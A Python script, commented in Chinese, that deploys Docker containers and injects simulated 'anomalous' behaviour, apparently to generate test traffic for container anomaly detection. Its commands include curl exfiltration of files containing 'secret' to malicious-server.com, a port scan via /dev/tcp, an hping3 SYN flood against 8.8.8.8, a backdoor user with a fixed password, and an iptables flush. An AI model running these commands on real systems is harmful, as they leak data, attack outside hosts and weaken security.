import os
import time
import random
import argparse
import docker
import threading
import requests
import logging
from datetime import datetime

# 设置日志配置
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("container_injector.log")
    ]
)
logger = logging.getLogger("container_injector")

class ContainerInjector:
    def __init__(self, total_containers=100, anomaly_ratio=0.1):
        """
        初始化容器注入器
        
        :param total_containers: 总容器数量
        :param anomaly_ratio: 异常容器比例 (0.0-1.0)
        """
        self.total_containers = total_containers
        self.anomaly_ratio = anomaly_ratio
        self.normal_containers = []
        self.anomaly_containers = []
        self.docker_client = docker.from_env()
        
        # 定义更稳妥的正常容器镜像（避免需要复杂初始化的 DB 类镜像）
        # 这些镜像在无额外配置下即可常驻运行
        self.normal_images = [
            "nginx:alpine",
            "redis:alpine",
            "httpd:alpine",
            "python:3.11-alpine",
            "node:lts-alpine",
            "alpine:latest"
        ]
        
        logger.info(f"初始化容器注入器: 总容器数={total_containers}, 异常比例={anomaly_ratio}")

    def deploy_containers(self):
        """部署正常和异常容器"""
        num_anomalies = int(self.total_containers * self.anomaly_ratio)
        num_normal = self.total_containers - num_anomalies
        
        logger.info(f"开始部署容器: 正常容器={num_normal}, 异常容器={num_anomalies}")
        
        # 部署正常容器
        for i in range(num_normal):
            try:
                image = random.choice(self.normal_images)
                container = self.docker_client.containers.run(
                    image,
                    detach=True,
                    name=f"normal-container-{i}-{datetime.now().strftime('%H%M%S')}",
                    command=self.get_normal_command(image),
                    tty=True,
                    stdin_open=False,
                    restart_policy={"Name": "unless-stopped"},
                    labels={"role": "normal"}
                )
                self.normal_containers.append(container)
                logger.info(f"部署正常容器: ID={container.short_id}, 镜像={image}")
            except Exception as e:
                logger.error(f"部署正常容器失败: {str(e)}")
        
        # 部署异常容器
        for i in range(num_anomalies):
            try:
                # 随机选择正常镜像作为基础，注入异常行为
                image = random.choice(self.normal_images)
                container = self.docker_client.containers.run(
                    image,
                    detach=True,
                    name=f"anomaly-container-{i}-{datetime.now().strftime('%H%M%S')}",
                    command=self.get_anomaly_command(),
                    tty=True,
                    stdin_open=False,
                    restart_policy={"Name": "unless-stopped"},
                    labels={"role": "anomaly"}
                )
                self.anomaly_containers.append(container)
                logger.info(f"部署异常容器: ID={container.short_id}, 镜像={image}")
            except Exception as e:
                logger.error(f"部署异常容器失败: {str(e)}")
    
    def get_normal_command(self, image):
        """获取正常容器的启动命令"""
        if "nginx" in image:
            return "nginx -g 'daemon off;'"
        elif "redis" in image:
            return "redis-server"
        elif "httpd" in image:
            return "httpd-foreground"
        elif "python" in image:
            return "python -m http.server 8000"
        elif "node" in image:
            return "node -e 'setInterval(() => console.log(\"Normal container running\"), 5000)'"
        elif "alpine" in image or "busybox" in image:
            # 轻量镜像，保持常驻
            return "sh -c 'while :; do sleep 60; done'"
        else:
            return "tail -f /dev/null"  # 默认保持运行

    def get_anomaly_command(self):
        """获取异常容器的启动命令"""
        # 随机选择一种异常类型
        anomaly_type = random.choice([
            "crypto_miner",
            "port_scanner",
            "data_exfil",
            "process_injector",
            "file_anomaly",
            "network_flood"
        ])
        
        # 根据异常类型返回不同的命令
        if anomaly_type == "crypto_miner":
            # 模拟加密货币挖矿行为
            return (
                "sh -c 'while true; do "
                "echo \"Mining cryptocurrency...\"; "
                "dd if=/dev/urandom bs=1M count=10 | sha256sum; "
                "sleep 1; "
                "done'"
            )
        
        elif anomaly_type == "port_scanner":
            # 模拟端口扫描行为
            return (
                "sh -c 'echo \"Starting port scan...\"; "
                "for port in $(seq 1 1000); do "
                "echo >/dev/tcp/scanme.nmap.org/$port && echo \"Port $port open\" || :; "
                "done; "
                "sleep 300; "
                "exec \"$@\"'"
            )
        
        elif anomaly_type == "data_exfil":
            # 模拟数据外泄行为
            return (
                "sh -c 'echo \"Exfiltrating data...\"; "
                "while true; do "
                "find / -type f -exec grep -q \"secret\" {} \\; -print | xargs -I {} curl -F 'file=@{}' http://malicious-server.com/exfil; "
                "sleep 30; "
                "done'"
            )
        
        elif anomaly_type == "process_injector":
            # 模拟进程注入行为
            return (
                "sh -c 'echo \"Injecting malicious processes...\"; "
                "while true; do "
                "nohup sleep 10 & "
                "nohup echo \"Malicious process running\" & "
                "sleep 5; "
                "done'"
            )
        
        elif anomaly_type == "file_anomaly":
            # 模拟文件异常行为
            return (
                "sh -c 'echo \"Performing suspicious file operations...\"; "
                "mkdir -p /malicious; "
                "while true; do "
                "dd if=/dev/urandom of=/malicious/file_$(date +%s).bin bs=1M count=5; "
                "chmod 600 /etc/passwd; "
                "sleep 10; "
                "done'"
            )
        
        elif anomaly_type == "network_flood":
            # 模拟网络洪水攻击
            return (
                "sh -c 'echo \"Starting network flood...\"; "
                "while true; do "
                "timeout 10 hping3 --flood -S -p 80 8.8.8.8; "
                "sleep 15; "
                "done'"
            )
    
    def monitor_containers(self, duration=600):
        """监控容器运行状态"""
        logger.info(f"开始监控容器，持续 {duration} 秒...")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                # 检查正常容器状态
                for container in self.normal_containers:
                    container.reload()
                    # 忽略短暂的 restarting 状态，减少误报
                    if container.status not in ("running", "restarting"):
                        logger.warning(f"正常容器停止: ID={container.short_id}")
                
                # 检查异常容器状态
                for container in self.anomaly_containers:
                    container.reload()
                    if container.status != "running":
                        logger.warning(f"异常容器停止: ID={container.short_id}")
                
                # 随机触发一些额外的异常行为
                if random.random() < 0.1 and self.anomaly_containers:
                    self._inject_additional_anomaly()
                
                time.sleep(10)
            except Exception as e:
                logger.error(f"监控容器时出错: {str(e)}")
                time.sleep(10)
        
        logger.info("监控周期结束")
    
    def _inject_additional_anomaly(self):
        """向随机异常容器注入额外异常行为"""
        container = random.choice(self.anomaly_containers)
        anomaly_type = random.choice([
            "install_malware",
            "modify_critical_files",
            "disable_security",
            "create_backdoor"
        ])
        
        try:
            if anomaly_type == "install_malware":
                cmd = "apt-get update && apt-get install -y nmap hping3"
                container.exec_run(cmd)
                logger.info(f"在容器 {container.short_id} 中安装额外工具")
            
            elif anomaly_type == "modify_critical_files":
                cmd = "echo 'malicious_entry' >> /etc/passwd && chmod 777 /tmp"
                container.exec_run(cmd)
                logger.info(f"在容器 {container.short_id} 中修改关键文件")
            
            elif anomaly_type == "disable_security":
                cmd = "sysctl -w kernel.yama.ptrace_scope=0 && iptables -F"
                container.exec_run(cmd)
                logger.info(f"在容器 {container.short_id} 中禁用安全设置")
            
            elif anomaly_type == "create_backdoor":
                cmd = "useradd -m -s /bin/bash backdoor && echo 'backdoor:password' | chpasswd"
                container.exec_run(cmd)
                logger.info(f"在容器 {container.short_id} 中创建后门账户")
        
        except Exception as e:
            logger.error(f"注入额外异常失败: {str(e)}")
    
    def cleanup(self):
        """清理所有容器"""
        logger.info("开始清理容器...")
        
        for container in self.normal_containers + self.anomaly_containers:
            try:
                container.stop()
                container.remove()
                logger.info(f"已清理容器: ID={container.short_id}")
            except Exception as e:
                logger.error(f"清理容器失败 {container.short_id}: {str(e)}")
        
        logger.info("清理完成")

def main():
    parser = argparse.ArgumentParser(description='容器异常注入脚本')
    parser.add_argument('--total', type=int, default=50, help='总容器数量')
    parser.add_argument('--anomaly-ratio', type=float, default=0.15, help='异常容器比例')
    parser.add_argument('--duration', type=int, default=600, help='运行持续时间(秒)')
    parser.add_argument('--no-cleanup', action='store_true', help='运行后不清理容器')
    args = parser.parse_args()
    
    injector = ContainerInjector(
        total_containers=args.total,
        anomaly_ratio=args.anomaly_ratio
    )
    
    try:
        # 部署容器
        injector.deploy_containers()
        
        # 监控容器运行
        injector.monitor_containers(duration=args.duration)
        
    except KeyboardInterrupt:
        logger.info("检测到中断信号，停止运行")
    except Exception as e:
        logger.error(f"运行过程中发生错误: {str(e)}")
    finally:
        if not args.no_cleanup:
            injector.cleanup()
        else:
            logger.info("跳过清理，容器保留运行状态")

if __name__ == "__main__":
    main()